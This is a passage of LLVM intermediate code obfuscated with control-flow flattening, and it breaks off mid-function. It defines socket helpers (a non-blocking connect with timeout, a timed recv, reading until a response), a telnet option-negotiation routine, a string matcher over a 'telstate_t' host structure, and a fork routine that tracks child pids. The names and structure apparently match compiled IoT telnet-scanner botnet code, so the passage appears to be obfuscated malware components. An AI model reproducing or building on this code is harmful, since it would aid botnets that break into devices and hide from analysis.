  store i32 0, i32* %18, align 4
  %90 = load i8*, i8** %6, align 8
  store i8* %90, i8** %17, align 8
  store i32 1794310777, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  %92 = load i32, i32* %7, align 4
  %93 = add nsw i32 %92, -1
  store i32 %93, i32* %7, align 4
  %94 = icmp sgt i32 %92, 1
  %95 = select i1 %94, i32 776782772, i32 -382732012
  store i32 %95, i32* %switchVar
  br label %loopEnd

; <label>:96:                                     ; preds = %loopEntry
  %97 = load i32, i32* @switchCommStock, align 4
  %98 = call i64 @recv(i32 %97, i8* %16, i64 1, i32 0)
  %99 = icmp ne i64 %98, 1
  %100 = select i1 %99, i32 1887834448, i32 -221342573
  store i32 %100, i32* %switchVar
  br label %loopEnd

; <label>:101:                                    ; preds = %loopEntry
  %102 = load i8*, i8** %17, align 8
  store i8 0, i8* %102, align 1
  store i32 -1, i32* %4, align 4
  store i32 -1404859904, i32* %switchVar
  br label %loopEnd

; <label>:103:                                    ; preds = %loopEntry
  %104 = load i8, i8* %16, align 1
  %105 = load i8*, i8** %17, align 8
  %106 = getelementptr inbounds i8, i8* %105, i32 1
  store i8* %106, i8** %17, align 8
  store i8 %104, i8* %105, align 1
  %107 = load i8, i8* %16, align 1
  %108 = zext i8 %107 to i32
  %109 = icmp eq i32 %108, 10
  %110 = select i1 %109, i32 426518864, i32 766234879
  store i32 %110, i32* %switchVar
  br label %loopEnd

; <label>:111:                                    ; preds = %loopEntry
  store i32 -382732012, i32* %switchVar
  br label %loopEnd

; <label>:112:                                    ; preds = %loopEntry
  %113 = load i32, i32* %18, align 4
  %114 = add nsw i32 %113, 1
  store i32 %114, i32* %18, align 4
  store i32 1794310777, i32* %switchVar
  br label %loopEnd

; <label>:115:                                    ; preds = %loopEntry
  %116 = load i8*, i8** %17, align 8
  store i8 0, i8* %116, align 1
  %117 = load i32, i32* %18, align 4
  store i32 %117, i32* %4, align 4
  store i32 -1404859904, i32* %switchVar
  br label %loopEnd

; <label>:118:                                    ; preds = %loopEntry
  %119 = load i32, i32* %4, align 4
  ret i32 %119

loopEnd:                                          ; preds = %115, %112, %111, %103, %101, %96, %91, %89, %88, %87, %84, %67, %58, %55, %51, %50, %33, %24, %switchDefault
  br label %loopEntry
}

declare i32 @select(i32, %struct.fd_set*, %struct.fd_set*, %struct.fd_set*, %struct.timeval*) #2

declare i64 @recv(i32, i8*, i64, i32) #2

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca %struct.fd_set, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i64, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i8* %1, i8** %7, align 8
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  %19 = load i32, i32* %6, align 4
  %20 = call i32 (i32, i32, ...) @fcntl(i32 %19, i32 3, i8* null)
  %21 = sext i32 %20 to i64
  store i64 %21, i64* %15, align 8
  %22 = load i64, i64* %15, align 8
  %23 = or i64 %22, 2048
  store i64 %23, i64* %15, align 8
  %24 = load i32, i32* %6, align 4
  %25 = load i64, i64* %15, align 8
  %26 = call i32 (i32, i32, ...) @fcntl(i32 %24, i32 4, i64 %25)
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %8, align 4
  %29 = trunc i32 %28 to i16
  %30 = call zeroext i16 @htons(i16 zeroext %29) #10
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i16 %30, i16* %31, align 2
  %32 = load i8*, i8** %7, align 8
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %34 = call i32 @getHost(i8* %32, %struct.in_addr* %33)
  store i32 %34, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 1614657789, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1614657789, label %first
    i32 -1015426497, label %37
    i32 -754161397, label %38
    i32 -884424163, label %47
    i32 -665162927, label %52
    i32 1946764929, label %57
    i32 1163055656, label %66
    i32 177425060, label %83
    i32 -814500161, label %90
    i32 181889878, label %91
    i32 1326488201, label %92
    i32 -448555850, label %93
    i32 1453102746, label %94
    i32 2039357312, label %95
    i32 220667383, label %96
    i32 -46306733, label %105
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %35 = icmp ne i32 %.reload, 0
  %36 = select i1 %35, i32 -1015426497, i32 -754161397
  store i32 %36, i32* %switchVar
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 -46306733, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  %40 = getelementptr inbounds [8 x i8], [8 x i8]* %39, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %40, i8 0, i64 8, i32 4, i1 false)
  %41 = load i32, i32* %6, align 4
  %42 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %43 = call i32 @connect(i32 %41, %struct.sockaddr* %42, i32 16)
  store i32 %43, i32* %16, align 4
  %44 = load i32, i32* %16, align 4
  %45 = icmp slt i32 %44, 0
  %46 = select i1 %45, i32 -884424163, i32 220667383
  store i32 %46, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  %48 = call i32* @__errno_location() #10
  %49 = load i32, i32* %48, align 4
  %50 = icmp eq i32 %49, 115
  %51 = select i1 %50, i32 -665162927, i32 1453102746
  store i32 %51, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  %53 = load i32, i32* %9, align 4
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 %54, i64* %55, align 8
  %56 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %56, align 8
  store i32 1946764929, i32* %switchVar
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  %58 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %11, i32 0, i32 0
  %59 = getelementptr inbounds [16 x i64], [16 x i64]* %58, i64 0, i64 0
  %60 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %59) #3, !srcloc !3
  %61 = extractvalue { i64, i64* } %60, 0
  %62 = extractvalue { i64, i64* } %60, 1
  %63 = trunc i64 %61 to i32
  store i32 %63, i32* %17, align 4
  %64 = ptrtoint i64* %62 to i64
  %65 = trunc i64 %64 to i32
  store i32 %65, i32* %18, align 4
  store i32 1163055656, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = load i32, i32* %6, align 4
  %68 = srem i32 %67, 64
  %69 = zext i32 %68 to i64
  %70 = shl i64 1, %69
  %71 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %11, i32 0, i32 0
  %72 = load i32, i32* %6, align 4
  %73 = sdiv i32 %72, 64
  %74 = sext i32 %73 to i64
  %75 = getelementptr inbounds [16 x i64], [16 x i64]* %71, i64 0, i64 %74
  %76 = load i64, i64* %75, align 8
  %77 = or i64 %76, %70
  store i64 %77, i64* %75, align 8
  %78 = load i32, i32* %6, align 4
  %79 = add nsw i32 %78, 1
  %80 = call i32 @select(i32 %79, %struct.fd_set* null, %struct.fd_set* %11, %struct.fd_set* null, %struct.timeval* %12)
  %81 = icmp sgt i32 %80, 0
  %82 = select i1 %81, i32 177425060, i32 1326488201
  store i32 %82, i32* %switchVar
  br label %loopEnd

; <label>:83:                                     ; preds = %loopEntry
  store i32 4, i32* %13, align 4
  %84 = load i32, i32* %6, align 4
  %85 = bitcast i32* %14 to i8*
  %86 = call i32 @getsockopt(i32 %84, i32 1, i32 4, i8* %85, i32* %13) #3
  %87 = load i32, i32* %14, align 4
  %88 = icmp ne i32 %87, 0
  %89 = select i1 %88, i32 -814500161, i32 181889878
  store i32 %89, i32* %switchVar
  br label %loopEnd

; <label>:90:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 -46306733, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  store i32 -448555850, i32* %switchVar
  br label %loopEnd

; <label>:92:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 -46306733, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  store i32 2039357312, i32* %switchVar
  br label %loopEnd

; <label>:94:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 -46306733, i32* %switchVar
  br label %loopEnd

; <label>:95:                                     ; preds = %loopEntry
  store i32 220667383, i32* %switchVar
  br label %loopEnd

; <label>:96:                                     ; preds = %loopEntry
  %97 = load i32, i32* %6, align 4
  %98 = call i32 (i32, i32, ...) @fcntl(i32 %97, i32 3, i8* null)
  %99 = sext i32 %98 to i64
  store i64 %99, i64* %15, align 8
  %100 = load i64, i64* %15, align 8
  %101 = and i64 %100, -2049
  store i64 %101, i64* %15, align 8
  %102 = load i32, i32* %6, align 4
  %103 = load i64, i64* %15, align 8
  %104 = call i32 (i32, i32, ...) @fcntl(i32 %102, i32 4, i64 %103)
  store i32 1, i32* %5, align 4
  store i32 -46306733, i32* %switchVar
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  %106 = load i32, i32* %5, align 4
  ret i32 %106

loopEnd:                                          ; preds = %96, %95, %94, %93, %92, %91, %90, %83, %66, %57, %52, %47, %38, %37, %first, %switchDefault
  br label %loopEntry
}

declare i32 @fcntl(i32, i32, ...) #2

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #6

declare i32 @connect(i32, %struct.sockaddr*, i32) #2

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #6

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #1

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() #0 {
  %.reg2mem = alloca i32
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32*, align 8
  %4 = alloca i32, align 4
  %5 = call i32 @fork() #3
  store i32 %5, i32* %2, align 4
  %6 = load i32, i32* %2, align 4
  store i32 %6, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -961487776, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -961487776, label %first
    i32 2104486530, label %9
    i32 1051076455, label %11
    i32 -1048132209, label %19
    i32 1285308304, label %26
    i32 450907733, label %36
    i32 -379539210, label %39
    i32 -657544213, label %49
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %7 = icmp ule i32 %.reload, 0
  %8 = select i1 %7, i32 2104486530, i32 1051076455
  store i32 %8, i32* %switchVar
  br label %loopEnd

; <label>:9:                                      ; preds = %loopEntry
  %10 = load i32, i32* %2, align 4
  store i32 %10, i32* %1, align 4
  store i32 -657544213, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i64, i64* @numpids, align 8
  %13 = add i64 %12, 1
  store i64 %13, i64* @numpids, align 8
  %14 = load i64, i64* @numpids, align 8
  %15 = add i64 %14, 1
  %16 = mul i64 %15, 4
  %17 = call noalias i8* @malloc(i64 %16) #3
  %18 = bitcast i8* %17 to i32*
  store i32* %18, i32** %3, align 8
  store i32 0, i32* %4, align 4
  store i32 -1048132209, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load i32, i32* %4, align 4
  %21 = zext i32 %20 to i64
  %22 = load i64, i64* @numpids, align 8
  %23 = sub i64 %22, 1
  %24 = icmp ult i64 %21, %23
  %25 = select i1 %24, i32 1285308304, i32 -379539210
  store i32 %25, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  %27 = load i32*, i32** @pids, align 8
  %28 = load i32, i32* %4, align 4
  %29 = zext i32 %28 to i64
  %30 = getelementptr inbounds i32, i32* %27, i64 %29
  %31 = load i32, i32* %30, align 4
  %32 = load i32*, i32** %3, align 8
  %33 = load i32, i32* %4, align 4
  %34 = zext i32 %33 to i64
  %35 = getelementptr inbounds i32, i32* %32, i64 %34
  store i32 %31, i32* %35, align 4
  store i32 450907733, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load i32, i32* %4, align 4
  %38 = add i32 %37, 1
  store i32 %38, i32* %4, align 4
  store i32 -1048132209, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = load i32, i32* %2, align 4
  %41 = load i32*, i32** %3, align 8
  %42 = load i64, i64* @numpids, align 8
  %43 = sub i64 %42, 1
  %44 = getelementptr inbounds i32, i32* %41, i64 %43
  store i32 %40, i32* %44, align 4
  %45 = load i32*, i32** @pids, align 8
  %46 = bitcast i32* %45 to i8*
  call void @free(i8* %46) #3
  %47 = load i32*, i32** %3, align 8
  store i32* %47, i32** @pids, align 8
  %48 = load i32, i32* %2, align 4
  store i32 %48, i32* %1, align 4
  store i32 -657544213, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %50 = load i32, i32* %1, align 4
  ret i32 %50

loopEnd:                                          ; preds = %39, %36, %26, %19, %11, %9, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @fork() #1

; Function Attrs: noinline nounwind uwtable
define i8* @get_telstate_host(%struct.telstate_t*) #0 {
  %2 = alloca %struct.telstate_t*, align 8
  %3 = alloca %struct.in_addr, align 4
  store %struct.telstate_t* %0, %struct.telstate_t** %2, align 8
  %4 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  %5 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %4, i32 0, i32 1
  %6 = load i32, i32* %5, align 4
  %7 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %3, i32 0, i32 0
  store i32 %6, i32* %7, align 4
  %8 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %3, i32 0, i32 0
  %9 = load i32, i32* %8, align 4
  %10 = call i8* @inet_ntoa(i32 %9) #3
  ret i8* %10
}

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @read_until_response(i32, i32, i8*, i32, i8**) #0 {
  %.reg2mem = alloca i32
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i32 %0, i32* %7, align 4
  store i32 %1, i32* %8, align 4
  store i8* %2, i8** %9, align 8
  store i32 %3, i32* %10, align 4
  store i8** %4, i8*** %11, align 8
  %14 = load i8*, i8** %9, align 8
  %15 = load i32, i32* %10, align 4
  %16 = sext i32 %15 to i64
  call void @llvm.memset.p0i8.i64(i8* %14, i8 0, i64 %16, i32 1, i1 false)
  %17 = load i32, i32* %7, align 4
  %18 = load i32, i32* %8, align 4
  %19 = load i8*, i8** %9, align 8
  %20 = load i32, i32* %10, align 4
  %21 = call i32 @read_with_timeout(i32 %17, i32 %18, i8* %19, i32 %20)
  store i32 %21, i32* %12, align 4
  %22 = load i8*, i8** %9, align 8
  %23 = getelementptr inbounds i8, i8* %22, i64 0
  %24 = load i8, i8* %23, align 1
  %25 = sext i8 %24 to i32
  store i32 %25, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 1663896548, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %5
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1663896548, label %first
    i32 635269315, label %28
    i32 -1393421432, label %32
    i32 -729800179, label %38
    i32 -182542816, label %39
    i32 -80703770, label %40
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %26 = icmp eq i32 %.reload, 255
  %27 = select i1 %26, i32 635269315, i32 -1393421432
  store i32 %27, i32* %switchVar
  br label %loopEnd

; <label>:28:                                     ; preds = %loopEntry
  %29 = load i32, i32* %7, align 4
  %30 = load i8*, i8** %9, align 8
  %31 = call i32 @negotiate(i32 %29, i8* %30, i32 3)
  store i32 -1393421432, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  %33 = load i8*, i8** %9, align 8
  %34 = load i8**, i8*** %11, align 8
  %35 = call i32 @contains_string(i8* %33, i8** %34)
  %36 = icmp ne i32 %35, 0
  %37 = select i1 %36, i32 -729800179, i32 -182542816
  store i32 %37, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  store i32 1, i32* %6, align 4
  store i32 -80703770, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  store i32 0, i32* %6, align 4
  store i32 -80703770, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i32, i32* %6, align 4
  ret i32 %41

loopEnd:                                          ; preds = %39, %38, %32, %28, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @read_with_timeout(i32, i32, i8*, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca %struct.fd_set, align 8
  %11 = alloca %struct.timeval, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i32 %1, i32* %7, align 4
  store i8* %2, i8** %8, align 8
  store i32 %3, i32* %9, align 4
  %14 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 0
  store i64 0, i64* %14, align 8
  %15 = load i32, i32* %7, align 4
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 1
  store i64 %16, i64* %17, align 8
  %switchVar = alloca i32
  store i32 -6486772, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -6486772, label %18
    i32 2086939585, label %27
    i32 -2030609880, label %44
    i32 1087834656, label %45
    i32 -136629396, label %52
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %10, i32 0, i32 0
  %20 = getelementptr inbounds [16 x i64], [16 x i64]* %19, i64 0, i64 0
  %21 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %20) #3, !srcloc !4
  %22 = extractvalue { i64, i64* } %21, 0
  %23 = extractvalue { i64, i64* } %21, 1
  %24 = trunc i64 %22 to i32
  store i32 %24, i32* %12, align 4
  %25 = ptrtoint i64* %23 to i64
  %26 = trunc i64 %25 to i32
  store i32 %26, i32* %13, align 4
  store i32 2086939585, i32* %switchVar
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  %28 = load i32, i32* %6, align 4
  %29 = srem i32 %28, 64
  %30 = zext i32 %29 to i64
  %31 = shl i64 1, %30
  %32 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %10, i32 0, i32 0
  %33 = load i32, i32* %6, align 4
  %34 = sdiv i32 %33, 64
  %35 = sext i32 %34 to i64
  %36 = getelementptr inbounds [16 x i64], [16 x i64]* %32, i64 0, i64 %35
  %37 = load i64, i64* %36, align 8
  %38 = or i64 %37, %31
  store i64 %38, i64* %36, align 8
  %39 = load i32, i32* %6, align 4
  %40 = add nsw i32 %39, 1
  %41 = call i32 @select(i32 %40, %struct.fd_set* %10, %struct.fd_set* null, %struct.fd_set* null, %struct.timeval* %11)
  %42 = icmp slt i32 %41, 1
  %43 = select i1 %42, i32 -2030609880, i32 1087834656
  store i32 %43, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 -136629396, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  %46 = load i32, i32* %6, align 4
  %47 = load i8*, i8** %8, align 8
  %48 = load i32, i32* %9, align 4
  %49 = sext i32 %48 to i64
  %50 = call i64 @recv(i32 %46, i8* %47, i64 %49, i32 0)
  %51 = trunc i64 %50 to i32
  store i32 %51, i32* %5, align 4
  store i32 -136629396, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  %53 = load i32, i32* %5, align 4
  ret i32 %53

loopEnd:                                          ; preds = %45, %44, %27, %18, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @negotiate(i32, i8*, i32) #0 {
  %.reg2mem = alloca i32
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %9 = load i8*, i8** %6, align 8
  %10 = getelementptr inbounds i8, i8* %9, i64 1
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  store i32 %12, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -612562118, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar3 = load i32, i32* %switchVar
  switch i32 %switchVar3, label %switchDefault [
    i32 -612562118, label %NodeBlock
    i32 -1352992516, label %LeafBlock1
    i32 -1170202174, label %LeafBlock
    i32 -359339021, label %16
    i32 1138560889, label %17
    i32 -1967789888, label %26
    i32 -1053074000, label %27
    i32 1374920176, label %34
    i32 -742043074, label %35
    i32 -288823938, label %42
    i32 -1254998918, label %50
    i32 35769339, label %58
    i32 -1443308138, label %59
    i32 1935911110, label %60
    i32 939441723, label %NewDefault
    i32 -1549899404, label %67
    i32 1298918338, label %68
    i32 723572051, label %69
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

NodeBlock:                                        ; preds = %loopEntry
  %.reload5 = load volatile i32, i32* %.reg2mem
  %Pivot = icmp slt i32 %.reload5, 255
  %13 = select i1 %Pivot, i32 -1170202174, i32 -1352992516
  store i32 %13, i32* %switchVar
  br label %loopEnd

LeafBlock1:                                       ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %SwitchLeaf2 = icmp eq i32 %.reload, 255
  %14 = select i1 %SwitchLeaf2, i32 -359339021, i32 939441723
  store i32 %14, i32* %switchVar
  br label %loopEnd

LeafBlock:                                        ; preds = %loopEntry
  %.reload4 = load volatile i32, i32* %.reg2mem
  %.off = add i32 %.reload4, -251
  %SwitchLeaf = icmp ule i32 %.off, 3
  %15 = select i1 %SwitchLeaf, i32 1138560889, i32 939441723
  store i32 %15, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  store i32 0, i32* %4, align 4
  store i32 723572051, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  store i8 -1, i8* %8, align 1
  %18 = load i32, i32* %5, align 4
  %19 = call i64 @send(i32 %18, i8* %8, i64 1, i32 16384)
  %20 = load i8*, i8** %6, align 8
  %21 = getelementptr inbounds i8, i8* %20, i64 1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp eq i32 252, %23
  %25 = select i1 %24, i32 -1967789888, i32 -1053074000
  store i32 %25, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  store i8 -2, i8* %8, align 1
  store i32 1935911110, i32* %switchVar
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  %28 = load i8*, i8** %6, align 8
  %29 = getelementptr inbounds i8, i8* %28, i64 1
  %30 = load i8, i8* %29, align 1
  %31 = zext i8 %30 to i32
  %32 = icmp eq i32 254, %31
  %33 = select i1 %32, i32 1374920176, i32 -742043074
  store i32 %33, i32* %switchVar
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  store i8 -4, i8* %8, align 1
  store i32 -1443308138, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load i8*, i8** %6, align 8
  %37 = getelementptr inbounds i8, i8* %36, i64 1
  %38 = load i8, i8* %37, align 1
  %39 = zext i8 %38 to i32
  %40 = icmp eq i32 3, %39
  %41 = select i1 %40, i32 -288823938, i32 -1254998918
  store i32 %41, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i8*, i8** %6, align 8
  %44 = getelementptr inbounds i8, i8* %43, i64 1
  %45 = load i8, i8* %44, align 1
  %46 = zext i8 %45 to i32
  %47 = icmp eq i32 %46, 253
  %48 = select i1 %47, i32 251, i32 253
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* %8, align 1
  store i32 35769339, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i8*, i8** %6, align 8
  %52 = getelementptr inbounds i8, i8* %51, i64 1
  %53 = load i8, i8* %52, align 1
  %54 = zext i8 %53 to i32
  %55 = icmp eq i32 %54, 253
  %56 = select i1 %55, i32 252, i32 254
  %57 = trunc i32 %56 to i8
  store i8 %57, i8* %8, align 1
  store i32 35769339, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  store i32 -1443308138, i32* %switchVar
  br label %loopEnd

; <label>:59:                                     ; preds = %loopEntry
  store i32 1935911110, i32* %switchVar
  br label %loopEnd

; <label>:60:                                     ; preds = %loopEntry
  %61 = load i32, i32* %5, align 4
  %62 = call i64 @send(i32 %61, i8* %8, i64 1, i32 16384)
  %63 = load i32, i32* %5, align 4
  %64 = load i8*, i8** %6, align 8
  %65 = getelementptr inbounds i8, i8* %64, i64 2
  %66 = call i64 @send(i32 %63, i8* %65, i64 1, i32 16384)
  store i32 1298918338, i32* %switchVar
  br label %loopEnd

NewDefault:                                       ; preds = %loopEntry
  store i32 -1549899404, i32* %switchVar
  br label %loopEnd

; <label>:67:                                     ; preds = %loopEntry
  store i32 1298918338, i32* %switchVar
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  store i32 0, i32* %4, align 4
  store i32 723572051, i32* %switchVar
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  %70 = load i32, i32* %4, align 4
  ret i32 %70

loopEnd:                                          ; preds = %68, %67, %NewDefault, %60, %59, %58, %50, %42, %35, %34, %27, %26, %17, %16, %LeafBlock, %LeafBlock1, %NodeBlock, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_string(i8*, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  %switchVar = alloca i32
  store i32 -1703386885, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1703386885, label %8
    i32 2117240902, label %17
    i32 1034830644, label %18
    i32 -1443218267, label %19
    i32 -1524101789, label %24
    i32 -938275176, label %34
    i32 -1938730213, label %35
    i32 1984456698, label %36
    i32 145226337, label %39
    i32 1830929941, label %40
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = load i8**, i8*** %5, align 8
  %10 = load i32, i32* %6, align 4
  %11 = add nsw i32 %10, 1
  store i32 %11, i32* %6, align 4
  %12 = sext i32 %11 to i64
  %13 = getelementptr inbounds i8*, i8** %9, i64 %12
  %14 = load i8*, i8** %13, align 8
  %15 = icmp ne i8* %14, null
  %16 = select i1 %15, i32 2117240902, i32 1034830644
  store i32 %16, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  store i32 -1703386885, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  store i32 0, i32* %7, align 4
  store i32 -1443218267, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load i32, i32* %7, align 4
  %21 = load i32, i32* %6, align 4
  %22 = icmp slt i32 %20, %21
  %23 = select i1 %22, i32 -1524101789, i32 145226337
  store i32 %23, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
